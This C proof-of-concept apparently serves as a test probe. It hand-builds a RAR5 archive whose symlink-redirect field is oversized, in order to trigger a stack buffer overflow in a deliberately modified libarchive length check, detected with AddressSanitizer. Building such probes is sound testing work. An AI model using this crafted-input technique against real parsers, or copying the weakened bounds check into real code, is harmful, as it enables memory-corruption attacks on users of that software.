/*
 * Proof-of-concept for the delocalized RAR5 redirect-target overflow.
 *
 * Drives libarchive's PUBLIC reader API on a hand-built, in-contract RAR5
 * archive containing a single file entry whose FILE header carries a
 * "redirection" (symlink) extra field (EX_REDIR, id 0x05).  The link-target
 * length is chosen to be larger than MAX_NAME_IN_CHARS (2048) but no larger
 * than MAX_NAME_IN_BYTES (8192).
 *
 * On the shipped (modified) tree the redirect length check accepts the value
 * (it now compares against MAX_NAME_IN_BYTES) while the destination buffer is
 * only MAX_NAME_IN_CHARS bytes, so parse_file_extra_redir() memcpy()s the
 * target into an undersized stack buffer -> AddressSanitizer stack overflow.
 *
 * On the original batch the length check (MAX_NAME_IN_CHARS) rejects the value
 * with a clean ARCHIVE_FATAL and nothing is copied, so the probe exits 0.
 *
 * Builds against the installed public headers only:
 *     cc -fsanitize=address probe.c -larchive
 */

#include <archive.h>
#include <archive_entry.h>

#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

/* ---- tiny growable byte buffer ------------------------------------------ */
struct buf {
	uint8_t *d;
	size_t len, cap;
};

static void buf_put(struct buf *b, const void *p, size_t n)
{
	if (b->len + n > b->cap) {
		size_t nc = b->cap ? b->cap * 2 : 64;
		while (nc < b->len + n)
			nc *= 2;
		b->d = (uint8_t *)realloc(b->d, nc);
		if (!b->d) {
			fprintf(stderr, "oom\n");
			exit(2);
		}
		b->cap = nc;
	}
	memcpy(b->d + b->len, p, n);
	b->len += n;
}

static void buf_byte(struct buf *b, uint8_t v) { buf_put(b, &v, 1); }

/* RAR5 base-128 little-endian variable integer. */
static void buf_vint(struct buf *b, uint64_t v)
{
	for (;;) {
		uint8_t byte = (uint8_t)(v & 0x7f);
		v >>= 7;
		if (v) {
			buf_byte(b, byte | 0x80);
		} else {
			buf_byte(b, byte);
			break;
		}
	}
}

/* ---- standard CRC-32 (IEEE, zlib polynomial), matches __archive_crc32 --- */
static uint32_t crc32_calc(const uint8_t *p, size_t n)
{
	static uint32_t table[256];
	static int have_table = 0;
	uint32_t crc;
	size_t i;

	if (!have_table) {
		for (i = 0; i < 256; i++) {
			uint32_t c = (uint32_t)i;
			int k;
			for (k = 0; k < 8; k++)
				c = (c & 1) ? (0xEDB88320u ^ (c >> 1)) : (c >> 1);
			table[i] = c;
		}
		have_table = 1;
	}

	crc = 0xFFFFFFFFu;
	for (i = 0; i < n; i++)
		crc = table[(crc ^ p[i]) & 0xff] ^ (crc >> 8);
	return crc ^ 0xFFFFFFFFu;
}

static void buf_le32(struct buf *b, uint32_t v)
{
	uint8_t t[4];
	t[0] = (uint8_t)(v & 0xff);
	t[1] = (uint8_t)((v >> 8) & 0xff);
	t[2] = (uint8_t)((v >> 16) & 0xff);
	t[3] = (uint8_t)((v >> 24) & 0xff);
	buf_put(b, t, 4);
}

/*
 * Emit a complete RAR5 base block: [CRC32][size-vint][body].
 * The size-vint encodes the body length; the CRC32 covers (size-vint + body).
 */
static void emit_block(struct buf *out, const struct buf *body)
{
	struct buf hdr = {0};
	buf_vint(&hdr, body->len);            /* raw_hdr_size */
	buf_put(&hdr, body->d, body->len);    /* body */

	buf_le32(out, crc32_calc(hdr.d, hdr.len));
	buf_put(out, hdr.d, hdr.len);
	free(hdr.d);
}

int main(void)
{
	const size_t TARGET_LEN = 4000;       /* 2048 < 4000 <= 8191 */
	struct buf archive = {0};

	/* RAR5 signature: "Rar!\x1A\x07\x01\x00". */
	static const uint8_t sig[8] = {0x52,0x61,0x72,0x21,0x1A,0x07,0x01,0x00};
	buf_put(&archive, sig, sizeof(sig));

	/* ---- MAIN header block (type 0x01, no flags, no archive flags). ---- */
	{
		struct buf body = {0};
		buf_vint(&body, 0x01);  /* header type: HEAD_MAIN */
		buf_vint(&body, 0x00);  /* header flags */
		buf_vint(&body, 0x00);  /* archive flags */
		emit_block(&archive, &body);
		free(body.d);
	}

	/* ---- EX_REDIR extra field content. ---- */
	struct buf field = {0};
	buf_vint(&field, 0x05);                 /* extra field id: EX_REDIR */
	buf_vint(&field, 0x01);                 /* redir_type: UNIXSYMLINK */
	buf_vint(&field, 0x00);                 /* redir_flags */
	buf_vint(&field, TARGET_LEN);           /* target length */
	{
		uint8_t *t = (uint8_t *)malloc(TARGET_LEN);
		memset(t, 'A', TARGET_LEN);
		buf_put(&field, t, TARGET_LEN);     /* target bytes */
		free(t);
	}

	/* The extra area: [field-size vint][field]. */
	struct buf extra = {0};
	buf_vint(&extra, field.len);
	buf_put(&extra, field.d, field.len);
	free(field.d);

	/* ---- FILE header block (type 0x02). ---- */
	{
		struct buf body = {0};
		buf_vint(&body, 0x02);              /* header type: HEAD_FILE */
		buf_vint(&body, 0x03);              /* flags: EXTRA_DATA|DATA */
		buf_vint(&body, extra.len);         /* extra area size */
		buf_vint(&body, 0x00);              /* data size */
		buf_vint(&body, 0x00);              /* file flags */
		buf_vint(&body, 0x00);              /* unpacked size */
		buf_vint(&body, 0x00);              /* file attributes */
		buf_vint(&body, 0x00);              /* compression info */
		buf_vint(&body, 0x01);              /* host OS: UNIX */
		buf_vint(&body, 0x04);              /* name length */
		buf_put(&body, "link", 4);          /* name */
		buf_put(&body, extra.d, extra.len); /* extra area */
		emit_block(&archive, &body);
		free(body.d);
	}
	free(extra.d);

	/* ---- Drive the public read API. ---- */
	struct archive *a = archive_read_new();
	struct archive_entry *entry;
	int r;

	archive_read_support_format_rar5(a);
	r = archive_read_open_memory(a, archive.d, archive.len);
	if (r != ARCHIVE_OK) {
		fprintf(stderr, "open failed: %s\n", archive_error_string(a));
		archive_read_free(a);
		free(archive.d);
		return 1;
	}

	r = archive_read_next_header(a, &entry);
	fprintf(stderr, "archive_read_next_header -> %d (%s)\n",
	    r, archive_error_string(a) ? archive_error_string(a) : "");

	archive_read_free(a);
	free(archive.d);
	return 0;
}
